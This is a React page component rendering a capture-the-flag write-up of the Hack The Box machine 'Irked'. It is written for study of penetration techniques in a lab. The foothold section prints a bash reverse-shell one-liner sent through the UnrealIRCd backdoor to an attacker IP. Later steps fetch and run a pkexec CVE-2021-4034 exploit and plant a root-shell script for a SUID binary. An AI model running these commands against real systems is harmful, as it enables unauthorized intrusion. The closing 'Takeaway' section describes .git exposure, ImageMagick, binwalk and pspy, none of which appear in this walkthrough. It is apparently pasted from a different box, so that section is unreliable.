import React from 'react';

// Import placeholder images - replace with actual screenshots
import irkedLogo from "../../assets/irked/logo.png"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/irked/nmap-scan.png"
import webInterface from "../../assets/irked/webpage.png"
import irssiCommands from "../../assets/irked/help.png"
import irssiVersion from "../../assets/irked/version.png"
import backdoorCode from "../../assets/irked/backdoor.png"
import reverseShell from "../../assets/irked/ircd.png"

import findFiles from "../../assets/irked/find.png"
import backupFile from "../../assets/irked/pass.png"
import sshLogin from "../../assets/irked/djmardov.png"

import linpeasOutput from "../../assets/irked/lin.png"
import pkexecExploit from "../../assets/irked/root1.png"
import viewuserError from "../../assets/irked/bin.png"
import ghidraAnalysis from "../../assets/irked/ghidra.png"
import viewuserRoot from "../../assets/irked/root2.png"


const Irked = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">22/07/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">🩸 Irked</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Dive deep into Irked, a fascinating box that combines multiple attack vectors! Exploit a backdoor in UnrealIRCd, uncover hidden credentials through steganography, and escalate privileges through SUID binary exploitation. This box showcases reverse engineering skills, demonstrating how vulnerable services and misconfigurations can lead to complete system compromise!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["backdoor", "CVE", "RCI", "reverse engineering", "SUID", "steganography", "IRC exploitation", "binary analysis"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={irkedLogo} alt="irked landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Irked HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('lateral-movement')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Lateral Movement
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('lateral-movement');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Lateral Movement
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.10.117
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see an interesting <span className="text-red-400">UnrealIRC</span> running and a website on port 80. Also we got the domain <span className="text-yellow-400">irked.htb</span>. Firstly let's visit the website.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.10.117 irked.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://irked.htb
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={webInterface} alt="web interface" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Apache <span className="text-red-400">HTTP</span> Server Version <span className="text-yellow-400">2.4</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we can see a hint to focus on the <span className="text-blue-400">IRC</span> for now. Googling IRC Enumeration, I found a tool to establish a connection and allow us to easily enumerate it. So first connect to the IRC
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            irssi -c $RHOST -p 6697
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After a successful connection we can run a bunch of these commands to enumerate
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            /help
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={irssiCommands} alt="irssi commands" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Running <span className="text-yellow-400">/version</span> allows us to grab the version of the service and with a quick search we can see that this version has a <span className="text-red-400 font-semibold">backdoor hidden</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            /version
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={irssiVersion} alt="irssi version" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can run this exploit made specifically for this backdoor : <span className="text-blue-400">https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And get a shell, but before I do that I am really interested how this backdoor is hidden and works.
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={backdoorCode} alt="backdoor code" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Shortly it has a <span className="text-yellow-400">debug3_log</span> function hidden which seems to be a debugging function but in fact it executes the command with <span className="text-red-400">system()</span> after the string <span className="text-orange-400">"AB"</span> so it should be just as simple as sending a message to the IRC starting with <span className="text-orange-400">AB</span> then including our payload.
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.11/9443 0>&1'" | nc 10.10.10.117 6697
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a shell as <span className="text-yellow-400">ircd</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Before we move on upgrade the shell
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On your attacking machine:
stty raw -echo; fg
# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="lateral-movement" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Lateral Movement</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now that we have foothold I enumerated <span className="text-yellow-400">/var</span> and <span className="text-yellow-400">/home/ircd</span> and couldn't find anything interesting then I saw that I can cd into other users home directory. Then running this reveled an interesting file
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /home/djmardov
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            find . -type f 2>/dev/null
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={findFiles} alt="find files" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat ./Documents/.backup
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={backupFile} alt="backup file" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-green-500/50 mb-6">
                        <code className="text-green-400 text-sm">
                            UPupDOWNdownLRlrBAbaSSss
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        It gives us a hint with <span className="text-red-400">steg</span> which stands for <span className="text-red-400 font-semibold">Steganography</span>. Which is hiding information within files like image, audio ext... Also it gives <span className="text-yellow-400">passphrase</span> that we can use to extract information. I tried looking for image files on the system without any success, but then I remembered the image on the website
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            http://irked.htb/irked.jpg
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then using a steg extracting tool <span className="text-blue-400">steghide</span> to get <span className="text-yellow-400">djmardov</span> password via ssh
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We got a file called <span className="text-orange-400">pass.txt</span> that reveals the password
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh djmardov@irked.htb
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got an ssh session !!!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sshLogin} alt="ssh login" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Privilege Escalation</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        First thing I did is running <span className="text-yellow-400">linpeas.sh</span> which reveled interesting <span className="text-red-400 font-semibold">SUID binaries</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={linpeasOutput} alt="linpeas output" />
                    
                    <div className="bg-[rgba(255,255,255,0.1)] p-4 rounded border border-yellow-400/50 mb-6">
                        <p className="text-yellow-300 text-sm">
                            <strong>Choice:</strong> We can get root shell with two methods both of them is an SUID exploit
                        </p>
                        <ul className="list-disc list-inside mt-2 text-sm">
                            <li>pkexec method</li>
                            <li>viewuser method</li>
                        </ul>
                    </div>
                    
                    <h3 className="text-lg mb-4 text-yellow-400">Privilege Escalation - PKEXEC Method</h3>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Linpeas shows us that this version is vulnerable to <span className="text-red-400">CVE-2021-4034</span> which is a more recent vulnerability than when the box was created so for sure this is not the intended way. But it's cool to have multiple ways to get root and it's also closer to a real penetration test.
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Googling the <span className="text-red-400">CVE</span> leads us to a <span className="text-blue-400">github</span> repo with the executable exploit
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        <span className="text-blue-400">https://github.com/mebeim/CVE-2021-4034</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            git clone https://github.com/mebeim/CVE-2021-4034.git
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then get it to the box
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server 80
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            wget -r http://[IP]/
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And now that its on the box we can just run <span className="text-yellow-400">expl.sh</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            chmod +x expl.sh
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ./expl.sh
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And as easy as that we got <span className="text-red-400 font-semibold">root</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={pkexecExploit} alt="pkexec exploit" />
                    
                    <h3 className="text-lg mb-4 text-yellow-400 mt-8">Privilege Escalation - VIEWUSER Method</h3>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Running viewuser reveals that it tries to get <span className="text-yellow-400">/tmp/listusers</span> however we can see that its not present neither do we know what it supposed to do with it
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={viewuserError} alt="viewuser error" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So let's do some reverse engineering hoping it does some <span className="text-red-400">system execution</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            which viewuser
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /usr/bin
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server 8000
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then from attacking machine
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            wget http://irked.htb:8000/viewuser
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now that we got it on the system let's run <span className="text-yellow-400">ghidra</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={ghidraAnalysis} alt="ghidra analysis" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that whatever is inside the <span className="text-yellow-400">/tmp/listusers</span> file it will be ran as <span className="text-red-400">UID 0</span> which is root. It means if we can create the <span className="text-yellow-400">/tmp/listusers</span> and put a bash script inside that gives us a <span className="text-red-400 font-semibold">root shell</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <pre className="text-green-400 text-sm">
{`nano /tmp/listusers

#!/bin/bash
/bin/bash`}
                        </pre>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            chmod +x /tmp/listusers
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Then simply execute the binary
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            viewuser
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And again we got a <span className="text-red-400 font-semibold">root shell</span> completing the box !!!
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={viewuserRoot} alt="viewuser root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Git Repository Exposure:</span> Exposed .git directories can leak critical source code, revealing database locations and application logic</li>
                            <li>• <span className="text-blue-400">ImageMagick Vulnerabilities:</span> CVE-2022-44268 allows arbitrary file reads through malicious PNG files, enabling sensitive data extraction</li>
                            <li>• <span className="text-yellow-400">Version Enumeration:</span> Always check versions of installed software - outdated binaries often contain exploitable vulnerabilities</li>
                            <li>• <span className="text-green-400">Process Monitoring:</span> Tools like pspy reveal background processes and scheduled tasks that may run with elevated privileges</li>
                            <li>• <span className="text-purple-400">Chained Exploits:</span> Combining multiple vulnerabilities (file read + RCE) can lead to complete system compromise</li>
                            <li>• <span className="text-orange-400">Binwalk Exploitation:</span> CVE-2022-4510 demonstrates how file analysis tools can be weaponized for remote code execution</li>
                            <li>• <span className="text-cyan-400">Automated Scanning:</span> Background malware scanners can be exploited by placing malicious files in monitored directories</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">ffuf</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">git-dumper</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">ImageMagick</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">pspy</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">binwalk</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">xxd</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">identify</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates the critical importance of proper source code management and version control. 
                                The exposed .git repository provided a roadmap for exploitation, while outdated software versions created multiple attack vectors. 
                                The combination of information disclosure through file read vulnerabilities and privilege escalation through automated processes 
                                shows how attackers can chain seemingly minor issues into complete system compromise.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Ensure .git directories are never exposed in production environments, 
                                regularly update all software components especially image processing libraries, implement proper access controls for 
                                automated scanning processes, and monitor for unusual file uploads or modifications in sensitive directories.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
       
        </div>
    )
}

export default Irked;